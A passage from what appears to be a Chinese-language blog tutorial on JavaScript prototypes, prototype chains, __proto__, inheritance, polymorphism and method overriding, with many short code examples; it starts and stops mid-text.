User(<span class="string">'Admin'</span>, <span class="number">18</span>,<span class="number">177</span> ,<span class="number">110</span>,...)</span><br><span class="line"><span class="comment">// 要再创建同个对象</span></span><br></pre></td></tr></table></figure><p>这样的参数要我们一个一个填进去，但我们已经新建了一个完全的一样的对象，而且这样子做还要防止参数一不小心填错导致对象不同</p><p>所以我们采用克隆的方式来创造一个一模一样的对象，ECMAScript 5提供了Object.create 方法，可以用来克隆对象</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> cloneAdmin = <span class="built_in">Object</span>.create( admin);</span><br></pre></td></tr></table></figure><p>这，便是js的克隆，在这时候，cloneAdmin.__proto__会指向admin，__proto__是啥，后面我们会提到，这里你只需要知道，这时候的cloneAdmin已经继承admin几乎所有属性包括方法了</p><h2 id="原型和原型链"><a href="#原型和原型链" class="headerlink" title="原型和原型链"></a>原型和原型链</h2><p>我们再来了解下原型和原型链，什么是原型，就像上面举的例子，cloneAdmin是通过admin克隆而来的，那么它的原型便是admin，如果现在有一个对象clone2，克隆自cloneAdmin，那么clone2的原型便是cloneAdmin，而从它到admin这一条线上的所有对象便是原型链</p><blockquote><p>js的继承：基于原型链的委托机制就是原型继承的本质</p></blockquote><p>如何理解这句话，我们继续上面的例子，现在cloneAdmin克隆自admin，那么它是可以使用admin的所有属性和方法的，前提是它没有覆盖掉原型的方法，这类似于我们学习其它语言的继承特性</p><p>所以我们也就可以知道：<strong>当对象无法响应某个请求时，会把该请求委托给它自己的原型</strong></p><p>所以，通过以上，可以得出：原型编程范型至少包括以下基本规则</p><ul><li>所有的数据都是对象</li><li>要得到一个对象，不是通过实例化类，而是找到一个对象作为原型并克隆它</li><li>对象会记住它的原型</li><li>如果对象无法响应某个请求，它会把这个请求委托给它自己的原型</li></ul><h2 id="所有的数据都是对象"><a href="#所有的数据都是对象" class="headerlink" title="所有的数据都是对象"></a>所有的数据都是对象</h2><p>JavaScript 中的根对象是 Object.prototype 对象。Object.prototype 对象是一个空的对象。我们在 JavaScript 遇到的每个对象，实际上都是从 Object.prototype 对象克隆而来的， Object.prototype 对象就是它们的原型。</p><p>在 JavaScript 语言里，我们并不需要关心克隆的细节，因为这是引擎内部负责实现的。</p><h2 id="JS的克隆"><a href="#JS的克隆" class="headerlink" title="JS的克隆"></a>JS的克隆</h2><p>JavaScript 的函数既可以作为普通函数被调用， 也可以作为构造器被调用。当使用 new 运算符来调用函数时，此时的函数就是一个构造器。 用 new 运算符来创建对象的过程，实际上也只是先克隆 Object.prototype 对象，再进行一些其他额外操作的过程。</p><h2 id="对象会记住它的原型"><a href="#对象会记住它的原型" class="headerlink" title="对象会记住它的原型"></a>对象会记住它的原型</h2><p>JavaScript 给对象提供了一个名为__proto__的隐藏属性，某个对象的__proto__属性默认会指向它的构造器的原型对象，即{Constructor}.prototype。</p><p>__proto__就是对象跟“对象构造器的原型”联系起来的纽带。（__proto__：指向该对象的构造函数的原型对象，prototype指向该构造函数的原型对象——来自<a href="https://www.zhihu.com/question/34183746/answer/58155878" target="_blank" rel="noopener">知乎</a>，强烈建议阅读该文章）</p><p><img src= "/img/loading.gif" data-src="https://pic3.zhimg.com/80/e83bca5f1d1e6bf359d1f75727968c11_720w.jpg?source=1940ef5c" alt="img"></p><h2 id="对象委托"><a href="#对象委托" class="headerlink" title="对象委托"></a>对象委托</h2><p>JavaScript 的对象最初都是由 Object.prototype 对象克隆而来的，但对象构造器的原型并不仅限于 Object.prototype 上，而是可以动态指向其他对象。</p><p>如：我们可以创建一个无原型的对象</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//第一参数为原型指向，第二个为对象属性编辑</span></span><br><span class="line"><span class="keyword">let</span> a = <span class="built_in">Object</span>.create(<span class="literal">null</span>, &#123;</span><br><span class="line">  name: &#123;</span><br><span class="line">    value: <span class="string">'hhh'</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>原型链并不是无限长的，当对象通过原型链找某个属性找到根节点而找不到时，则会返回undefined（Object.prototype 的原型是 null）</p><h1 id="基于原型的继承以及constructor"><a href="#基于原型的继承以及constructor" class="headerlink" title="基于原型的继承以及constructor"></a>基于原型的继承以及constructor</h1><p>通过上面，我们可以知道继承是可以通过原型实现，通过上面的继承原型图，我们进行相应的练习</p><p><img src= "/img/loading.gif" data-src="https://pic3.zhimg.com/80/e83bca5f1d1e6bf359d1f75727968c11_720w.jpg?source=1940ef5c" alt="img"></p><p>首先创建构造函数User</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">User</span> (<span class="params">name, age</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = name</span><br><span class="line">  <span class="keyword">this</span>.age = age</span><br><span class="line">  <span class="keyword">this</span>.getDetail = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span>  <span class="string">`我叫<span class="subst">$&#123;<span class="keyword">this</span>.name&#125;</span>，今年<span class="subst">$&#123;<span class="keyword">this</span>.age&#125;</span>岁了`</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过构造函数，我们新建一个对象zhangsan</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> zhangsan = <span class="keyword">new</span> User(<span class="string">'张三'</span>, <span class="number">18</span>)</span><br></pre></td></tr></table></figure><p>现在我们想新建另一个对象李四，让它直接继承于张三（也就是张三的儿子），我们可以这样</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> zhangsan = <span class="keyword">new</span> User(<span class="string">'张三'</span>, <span class="number">18</span>)</span><br><span class="line"><span class="keyword">let</span> lisi = &#123;&#125;</span><br><span class="line"><span class="built_in">Object</span>.setPrototypeOf(lisi, zhangsan)</span><br><span class="line">lisi.name = <span class="string">'李四'</span></span><br></pre></td></tr></table></figure><p>ok，这样我们就简单的实现了继承，然后，提出一个问题，张三、李四以及构造函数User之间的关系是怎样的（通过上图理解）</p><p>弄清楚之后，你便会对__proto__、prototype、原型继承、原型和原型链有了更深刻的理解(下面是答案，记住一点，prototype是构造函数独有的，对象并没有这个属性，且这个属性指向构造函数原型)</p><p><img src= "/img/loading.gif" data-src="/2021/08/22/%E5%8E%9F%E5%9E%8B/%E5%8E%9F%E5%9E%8B%E7%BB%A7%E6%89%BF.png" alt="原型继承"></p><p>通过这张图，我们也可以知道</p><p><code>User.prototype.constructor() === User()</code></p><p>也就是说，你也可以通过<code>new User.prototype.constructor()</code>创建对象，当然正常人不会这样做（麻烦）</p><h1 id="构造函数-对象的原型检测"><a href="#构造函数-对象的原型检测" class="headerlink" title="构造函数/对象的原型检测"></a>构造函数/对象的原型检测</h1><p>我们想要对某一个对象的原型进行判断，有两种方法，一种是通过判断构造函数，另一种则是直接判断对象</p><p>首先我们声明三个类、定义它们间的关系以及实例化出各自的对象</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">A</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">B</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">C</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> a = <span class="keyword">new</span> A()</span><br><span class="line">B.prototype = a</span><br><span class="line"><span class="keyword">let</span> b = <span class="keyword">new</span> B()</span><br><span class="line">C.prototype = b</span><br><span class="line"><span class="keyword">let</span> c = <span class="keyword">new</span> C()</span><br></pre></td></tr></table></figure><ol><li><p>instanceof方法（构造函数）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(a <span class="keyword">instanceof</span> A)</span><br><span class="line"><span class="built_in">console</span>.log(b <span class="keyword">instanceof</span> B)</span><br><span class="line"><span class="built_in">console</span>.log(b <span class="keyword">instanceof</span> A)</span><br><span class="line"><span class="built_in">console</span>.log(c <span class="keyword">instanceof</span> A)</span><br><span class="line"><span class="built_in">console</span>.log(c <span class="keyword">instanceof</span> B)</span><br><span class="line"><span class="built_in">console</span>.log(c <span class="keyword">instanceof</span> C)</span><br></pre></td></tr></table></figure><p>结果都为真</p></li><li><p>dad isPrototypeOf(son)（对象）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(a.isPrototypeOf(b))</span><br><span class="line"><span class="built_in">console</span>.log(b.isPrototypeOf(c))</span><br><span class="line"><span class="built_in">console</span>.log(a.isPrototypeOf(c))</span><br></pre></td></tr></table></figure><p>结果也都为真</p></li></ol><p>两个方法都会循着原型链向上找，唯一不同的便是instanceof需要传入构造函数，而另一个方法则是传入对象</p><h1 id="原型链中的对象遍历"><a href="#原型链中的对象遍历" class="headerlink" title="原型链中的对象遍历"></a>原型链中的对象遍历</h1><p>首先胡乱设置两个对象，同时这两个对象有继承关系</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = &#123;</span><br><span class="line">  name: <span class="string">'a'</span>,</span><br><span class="line">  A() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"我叫"</span> + <span class="keyword">this</span>.name</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> b = &#123;</span><br><span class="line">  age: <span class="number">16</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">b.__proto__ = a</span><br></pre></td></tr></table></figure><p>好的，也就是说a是b的爸爸，然后我们来遍历一下b对象</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">in</span> b) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(key)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果是什么(name 、age、A())</p><p>由此我们可以得出：in遍历是会遍历出包含原型链上其它原型的属性方法，那么如果我们只是想要遍历b独有的方法呢</p><p>这时候可以利用hasOwnProperty()方法去判断方法属性是否属于当前调用对象独有的，使用方式如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">被检测对象.hasOwnProperty(<span class="string">'key'</span>)</span><br></pre></td></tr></table></figure><p>所以我们就可以使用for_in循环遍历出当前对象的属性方法了</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">in</span> b) &#123;</span><br><span class="line">  <span class="comment">// 判断当前属性是否为当前对象独有</span></span><br><span class="line">  <span class="keyword">if</span> (b.hasOwnProperty( key)) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(key)   </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得出的结果就是b自己独有的属性方法啦</p><h1 id="借用其他原型链方法"><a href="#借用其他原型链方法" class="headerlink" title="借用其他原型链方法"></a>借用其他原型链方法</h1><p>现在我们有个数组arr，当有个需求要我们求出这个数组的最大值时，你会咋做嘞</p><p>有些人可能会这样做</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> res = arr.sort(<span class="function">(<span class="params">a,b</span>) =&gt;</span> b - a)[<span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>也有可能这样</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> res = arr.reduce(<span class="function">(<span class="params">v, c</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> c &gt; v ? c : v</span><br><span class="line">&#125;, <span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>但是嘞，这些都是基于数组原型的方法实现的，声明的数组类型本来就是指向该原型的，那如果这时候我想调用Math里面的方法去实现这一需求，Math.max()方法不需要上面那么复杂的逻辑实现，更简单有木有，但是要如何做呢</p><p>这时候我们就要用到apply或call方法啦（两个函数都可以改变方法的this指向）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> b = <span class="built_in">Math</span>.max.apply(<span class="literal">null</span>, arr)</span><br></pre></td></tr></table></figure><p>这样得出来的结果也是一样的，更简单明了是不，他的原理便是改变原函数max的指向，使得我们可以调用不处于同一条原型链的其它对象的方法</p><p>再来一个例子，我们利用数组的过滤来对Dom进行操作，需求是这样的：给出两个input控件，我们想要获得指定的控件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">v-model</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"a"</span> <span class="attr">value</span>=<span class="string">"我是a"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">v-model</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"b"</span> <span class="attr">value</span>=<span class="string">"我是b"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>我们想要获得name=a的元素，怎么做呢，很简单：1.获取所有input控件 2.调用数组的filter方法进行过滤筛选</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> ts = <span class="built_in">document</span>.querySelectorAll(<span class="string">'[v-model]'</span>)</span><br><span class="line"><span class="keyword">let</span> res = <span class="built_in">Array</span>.prototype.filter.call(ts, e =&gt; e.getAttribute(<span class="string">'name'</span>) === <span class="string">'a'</span>);</span><br><span class="line"><span class="comment">//下面的方法也行</span></span><br><span class="line"><span class="comment">// let res = [].filter.call(ts,e =&gt; e.getAttribute('name') === 'a')</span></span><br><span class="line"><span class="built_in">console</span>.log(res[<span class="number">0</span>].value)</span><br></pre></td></tr></table></figure><h1 id="构造函数原型方法和构造函数内的方法"><a href="#构造函数原型方法和构造函数内的方法" class="headerlink" title="构造函数原型方法和构造函数内的方法"></a>构造函数原型方法和构造函数内的方法</h1><p>从前面我们可以知道，用构造函数实例化出来的对象，他的原型是构造函数的prototype属性，那么当我们给构造函数的prototype对象添加方法时，这个实例化出来的对象也可以使用该方法，那要是将一个对象的__proto__指向该构造函数的prototype时，它是否可以使用构造函数内部定义的方法呢，让我们看一下</p><p>首先定义一个构造函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> User = <span class="function"><span class="keyword">function</span>(<span class="params">name, age= <span class="number">18</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = name</span><br><span class="line">  <span class="keyword">this</span>.age = age</span><br><span class="line">  <span class="keyword">this</span>.getName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'我叫'</span> + <span class="keyword">this</span>.name)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>给它的原型新增方法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">User.prototype.getAge = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.age</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实例化一个对象，并分别调用构造函数内的方法和构造函数prototype的方法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> user1 = <span class="keyword">new</span> User(<span class="string">'user1'</span>, <span class="number">19</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(user1.getAge())</span><br><span class="line">user1.getName()</span><br></pre></td></tr></table></figure><p>结果都可以正常显示</p><p>接着我们直接定义另一个对象，并强制将其原型指向User.prototype</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> user3 = &#123;&#125;</span><br><span class="line">user3.__proto__ = User.prototype</span><br></pre></td></tr></table></figure><p>调用getAge()方法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(user3.getAge())</span><br></pre></td></tr></table></figure><p>正常显示，调用getName()方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user3.getName()</span><br></pre></td></tr></table></figure><p>无法执行，程序报错，显示该错误：user3.getName is not a function</p><p>所以由此我们可以得出，构造函数内部定义的方法，只有在由他实例化出来的对象才会得到，而将一个自定义对象原型指向该构造函数的prototype对象时，是无法使用该构造函数内部的方法的，但是毫无疑问的，它可以使用该构造函数的prototype对象内的方法</p><h1 id="设置和获得原型"><a href="#设置和获得原型" class="headerlink" title="设置和获得原型"></a>设置和获得原型</h1><p>上面我们可以知道，设置对象的原型可以直接使用obj.__proto__属性强制绑定，下面是Object自带的两个方法进行原型设置以及获得当前对象的原型</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//设置原型</span></span><br><span class="line"><span class="built_in">Object</span>.setPrototypeOf(son, dad)</span><br></pre></td></tr></table></figure><p>该方法和son.__proto__ = dad一致</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获得原型</span></span><br><span class="line"><span class="built_in">Object</span>.getPrototypeOf(son)</span><br></pre></td></tr></table></figure><p>使用该方法即可获得他爹了</p><h1 id="proto-原理（get、set）"><a href="#proto-原理（get、set）" class="headerlink" title="__proto__原理（get、set）"></a>__proto__原理（get、set）</h1><p>不知道你们有没有试过，将对象的__proto__属性定义成出对象外的其它值类型数据是不可行的</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj =&#123;&#125;</span><br><span class="line">obj.__proto__ = <span class="number">3</span></span><br></pre></td></tr></table></figure><p>这样是没有任何效果的，为什么呢，因为__proto__实际上是访问器(get/set)构造而成的，他会对设置的值进行过滤，只有符合对象类型的数据，它才会赋值，让我们来仿造一个，了解其实质</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> Obj  = &#123;</span><br><span class="line">  obj: &#123;</span><br><span class="line">    name: <span class="string">'obj'</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="keyword">get</span> _proto_() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.obj</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="keyword">set</span> _proto_(e) &#123;</span><br><span class="line">    <span class="keyword">if</span>(e <span class="keyword">instanceof</span> <span class="built_in">Object</span>) &#123;</span><br><span class="line">      <span class="keyword">this</span>.obj = e</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">Obj._proto_ = <span class="number">3</span></span><br><span class="line"><span class="built_in">console</span>.log(Obj._proto_);</span><br></pre></td></tr></table></figure><p>核心代码便是<code>e instanceof Object</code>，即判断当前传入类型是否为对象，是则赋值成功，否则忽略该赋值</p><h1 id="基于原型面向对象的多态"><a href="#基于原型面向对象的多态" class="headerlink" title="基于原型面向对象的多态"></a>基于原型面向对象的多态</h1><p>js也可以多态，你没骗我吧，没有的事呢，那就让我们来看看js的多态究竟是个啥</p><p>假设现在有个情况，你家里来客人了，你爸叫你和你妹跟客人打招呼，你说了句“叔叔好，我是我爸的儿子jie（假设你叫jie）”，你妹说：“叔叔好，我是我爸的女儿hua（假设你妹叫hua）”</p><p>看到没有，同样的一个行为，哥哥和妹妹的表现是不同的，这便是多态。让我们用代码实现一下</p><p>首先定义爸爸构造函数，然后 给爸爸原型定义一个介绍的方法（毕竟指令由爹地发出的）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Father</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">Father.prototype.introduction = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="keyword">this</span>.show());</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>接着构造儿子，并继承于老爸，然后定义儿子的介绍方法show()</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使得Son.prototype.__proto__指向Father.prototype</span></span><br><span class="line">Son.prototype = <span class="built_in">Object</span>.create(Father.prototype);</span><br><span class="line">Son.prototype.show = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'我是儿子'</span> + <span class="keyword">this</span>.name;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>再来就是女儿，和儿子一样，但是其show()方法和儿子有所不同</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Daughter</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = name;</span><br><span class="line">&#125;</span><br><span class="line">Daughter.prototype = <span class="built_in">Object</span>.create(Father.prototype);</span><br><span class="line">Daughter.prototype.show = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'我是女儿'</span> + <span class="keyword">this</span>.name;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>然后就是实例化一个儿子和女儿</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> jie = <span class="keyword">new</span> Son(<span class="string">'jie'</span>)</span><br><span class="line"><span class="keyword">let</span> hua = <span class="keyword">new</span> Daughter(<span class="string">'hua'</span>)</span><br></pre></td></tr></table></figure><p>假设此时他们接收到了父亲的指令，于是乎分别调用introduction方法并介绍自己</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jie.introduction() <span class="comment">//我是儿子jie</span></span><br><span class="line">hua.introduction() <span class="comment">//我是女儿hua</span></span><br></pre></td></tr></table></figure><p>这便是js的多态实现</p><h1 id="方法重写"><a href="#方法重写" class="headerlink" title="方法重写"></a>方法重写</h1><p>没啥好说的，就是继承父类的方法，但是由自己的实现方式，需要重新定义，这便是重写，直接理解代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义一个father构造函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Father</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.hi = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'father hi'</span>);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建son对象</span></span><br><span class="line"><span class="keyword">let</span> son = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实例化爹地</span></span><br><span class="line"><span class="keyword">let</span> father = <span class="keyword">new</span> Father();</span><br><span class="line"><span class="comment">// 让son的原型指向爹地对象</span></span><br><span class="line">son = <span class="built_in">Object</span>.create(father);</span><br><span class="line">son.hi()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 重写son方法</span></span><br><span class="line">son.hi = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'son hi'</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">son.hi();</span><br></pre></td></tr></table></figure><h1 id="禁止自定义函数原型的constructor被遍历"><a href="#禁止自定义函数原型的constructor被遍历" class="headerlink" title="禁止自定义函数原型的constructor被遍历"></a>禁止自定义函数原型的constructor被遍历</h1><p>之前我们已经了解过consructor，它是构造函数原型里面指向构造函数的一个属性，如下，两者是等价的</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User.prototype.constructor === User</span><br></pre></td></tr></table></figure><p>但当我们想让一个构造函数的原型继承于另一个构造函数时，会发生一点意外</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Father</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">Father.prototype.hi = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'father hi'</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Son</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = <span class="string">'son'</span></span><br><span class="line">&#125;</span><br><span class="line">Son.prototype = <span class="built_in">Object</span>.create(Father.prototype);</span><br></pre></td></tr></table></figure><p>在这里面，我们让Son的prototype原型指向Father.prototype，看起来好像一切都正常，也不影响继承，但是仔细观察你会发现，里面的constructor不见了，通过打印<code>console.dir(Son.prototype)</code>，我们可以发现它的constructor确实不见了</p><p><img src= "/img/loading.gif" data-src="/2021/08/22/%E5%8E%9F%E5%9E%8B/image-20210528202637586.png" alt="image-20210528202637586"></p><p>这会造成什么问题，你会无法通过下列方法实例化对象</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> son = <span class="keyword">new</span> 